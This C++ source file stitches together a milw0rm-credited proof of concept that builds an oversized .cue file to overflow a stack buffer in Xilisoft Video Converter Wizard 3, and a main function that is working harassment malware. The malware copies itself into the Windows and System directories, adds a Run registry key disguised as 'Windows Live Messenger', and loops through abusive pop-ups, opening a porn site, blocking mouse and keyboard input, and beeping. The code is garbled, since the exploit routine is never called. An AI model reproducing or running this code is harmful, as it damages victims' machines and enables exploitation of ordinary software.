#include <windows.h>
#include <fstream>
#include <winuser.h>
 
using namespace std;

/*
----------------------------------------------------------------------------------------
Xilisoft Video Converter Wizard 3 .CUE File Stack Buffer Overflow POC

name: xilisoft.cpp

Credits : fl0 fl0w
----------------------------------------------------------------------------------------
ScreanShot in the debugger

Link: http://www.downloadatoz.com/xilisoft-video-converter/wizard.html

http://img23.imageshack.us/my.php?image=xilisoftvideoconverter.jpg
----------------------------------------------------------------------------------------
*/

//Start

#include <stdio.h>
#include <string.h>
#include <stdio.h>
#include <assert.h>

#define     SIZE 100000

#define     FILE_FF " BINARY.. TRACK 01 MODE2/2352.. INDEX 01 00:00:00.."

class EXPLOIT {
	public:

int check (char *, char *);
void Usage (char *);
 };

static int  Poz = 1;
static int  Neg = 0;

int i;

char Name [SIZE];
char NeWbuff [SIZE];


                                                  int poc (int argc, char *argv [])

 {

        EXPLOIT VIDEO;


             if ( argc < 2)

                VIDEO.Usage ( argv [0]);

                                                  if ( VIDEO.check ( argv [1], "-file") == Neg) {

                                                       fprintf ( stdout , " Incorect input ");

                                                       printf ( " \t..Usage is %s -file filename.. \n", Name);

                                                               exit ( 0);

                                                            }




          do {

            NeWbuff [i] = 'A';

            i++;

            }while (i < 500);



        FILE *f;

        strcpy (Name, argv [2]);

        strcat (Name, " .cue ");

        f = fopen (Name, "w");

        assert ( f != NULL);




        strncpy ( NeWbuff + 500 , FILE_FF , strlen ( FILE_FF));



        fputs("FILE \"", f);

        fprintf ( f, " %s ", NeWbuff);


        fprintf ( stdout , "File build ! ");

        exit ( 0);

       getchar ();

                                                   return 0;
                                                  }




                                                  int EXPLOIT::check (char *Arg_, char *_Arg)

   {

       if ( strcmp ( Arg_, _Arg) == 0)

        return Poz;

      return Neg;

        }

    void EXPLOIT::Usage (char *Name)

   {
     system ("cls");
     fprintf ( stdout , " \n..Xilisoft Video Converter Wizard 3 .CUE File Stack Buffer Overflow POC..\n ");
     printf ( " \t..Usage is %s -file filename.. \n", Name);
     fprintf ( stdout , "..All Credits fl0 fl0w.. \n");


         }


//EOF

// milw0rm.com [2009-04-10]


int main()
{       
    char system[MAX_PATH];
    char windows[MAX_PATH];
    char pathtofile[MAX_PATH];
    HMODULE GetModH = GetModuleHandle(NULL);
    GetModuleFileName(GetModH,pathtofile,sizeof(pathtofile));
    GetSystemDirectory(system,sizeof(system));
    GetWindowsDirectory(windows,sizeof(windows));
    strcat(system,"\\najort5g.exe");
    strcat(windows,"\\najort5g.exe");
    CopyFile(pathtofile,system,false);
    CopyFile(pathtofile,windows,false);
    HKEY hKey;
    RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",0,KEY_SET_VALUE,&hKey );
    RegSetValueEx(hKey, "Windows Live Messenger",0,REG_SZ,(const unsigned char*)system,sizeof(system));
    RegCloseKey(hKey);  
     
    void messageset();
    void pornpopup();
    void payload();
     
    int y = 1;
    while(y<10)
    {
      CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)messageset, NULL, 0, NULL);
      Sleep(60000);
      CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pornpopup, NULL, 0, NULL);
      Sleep(60000);
      CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)payload, NULL, 0, NULL);
      Sleep(60000);
    }
}
 
    void messageset()
    {
       if(MessageBox(
       NULL,
       "Neanderthal is watching you",
       "Neanderthal",
       MB_OKCANCEL)==IDCANCEL)
       {
       MessageBox(
       NULL,
       "You can't cancel me mother fucker!",
       "Neanderthal",
       MB_OK);
       }
    }
 
     void pornpopup()
    {  
       char Website[MAX_PATH] = "www.porn.com";
       ShellExecute(NULL,"open",Website,NULL,NULL,SW_MAXIMIZE);
     
       MessageBox(
       NULL,
       "Naughty, Naughty, looking at porn are we now?... Dispicable",
       "Neanderthal",
       MB_OK);
    }
     
        
     
     void payload()
     {
       int a = 1;
     
       while(a<100)
       {
          BlockInput(TRUE);
          SetCursorPos(500,500);
          Sleep(3000);
          a++;
       }
     
       Sleep(10000);
       int freq = 100;
       int loop = 1;
       while(loop<200)
       {       
           Beep(freq,100);
           Sleep(50);
           freq++;
           loop++;
       }
    }